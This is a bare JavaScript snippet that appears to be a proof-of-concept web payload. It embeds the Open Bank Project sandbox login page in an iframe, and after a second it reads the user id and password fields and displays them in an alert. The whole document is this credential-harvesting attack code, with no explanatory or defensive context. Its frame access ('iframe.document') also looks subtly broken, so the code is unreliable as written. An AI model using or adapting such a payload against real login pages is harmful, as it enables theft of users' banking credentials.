var iframe = document.createElement("iframe");   
iframe.src = "https://apisandbox.openbankproject.com/user_mgt/login";
 iframe.style.width = "640px";
 iframe.style.height = "480px";
document.body.appendChild(iframe);

setTimeout(function(){
		id = iframe.document.forms[0].elements[0].value;
		password = iframe.document.forms[0].elements[1].value;
		alert(id + '&' + password);
	}, 1000);
